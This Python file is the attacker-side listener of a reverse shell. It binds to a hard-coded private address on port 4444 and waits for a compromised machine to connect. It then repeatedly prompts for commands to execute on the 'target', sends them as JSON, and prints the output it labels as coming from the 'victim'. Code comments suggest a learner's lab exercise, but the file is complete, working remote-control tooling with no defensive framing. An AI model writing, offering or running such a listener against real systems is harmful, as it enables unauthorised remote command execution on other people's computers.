import socket, sys, json
from sys import getsizeof


class Listener:
    
    
    def __init__(self,ip,port):
        #self.byteTotal = 0
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
        self.listener.listen(0)
        print('Starting listener... waiting for connection') #add a threading spinner here
        try:
            self.connection,address = self.listener.accept() #address is tuple with address and port
        except KeyboardInterrupt:
            print('\nSIGINT caught, exiting...')
            sys.exit()
        #print(connection) #connection is the socket object with information about local address and remote address
        print('Connection established with ' + str(address[0]) + ' on port ' + str(address[1]))
        print('Enter \'bye\' to close connection')
    
    
    def sendStream(self,data):
        jsData = json.dumps(data)
        self.connection.send(str(jsData).encode('utf-8'))


    def recvStream(self):
        jsData = ''
        #print(getsizeof(jsData))
        while True:
            try:
                recvData = self.connection.recv(1024)
                recvData = recvData.decode()
                #print(getsizeof(jsData))
                #byteSize = getsizeof(jsData)
                #self.byteTotal += byteSize
                jsData = jsData + recvData
                return json.loads(jsData)
            except Exception as e:
                #print(e)
                continue
                
    def utf8len(self,string):
        return len(string.encode('utf-8'))


    def executeCmd(self,cmd):
        #cmd = str(cmd).encode('utf-8')
        #print('executeCmd')
        #print(cmd)
        self.sendStream(cmd)
        #result = self.connection.recv(1024)
        #result = result.decode()
        return self.recvStream() #calling.executeCmd will return the result of the command sent by run()


    def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
        while True:
            inputChecker = False
            while inputChecker == False:
                cmd = input('Enter command to execute on target:')
                if cmd == '':
                    print('Command must not be blank')
                else:
                    inputChecker = True
            if cmd != 'bye':
                result = self.executeCmd(cmd)
                print('Output from victim, {} bytes long'.format(self.utf8len(result)))
                print('#'*100)
                print(result)
                print('#'*100)
            else:
                print('Exit call received, closing connection')
                self.listener.close()
                sys.exit() 
          

try:
    listener = Listener('192.168.241.133',4444)
    listener.run()
except KeyboardInterrupt:
    print('Interrupt caught, exiting...')
    sys.exit()


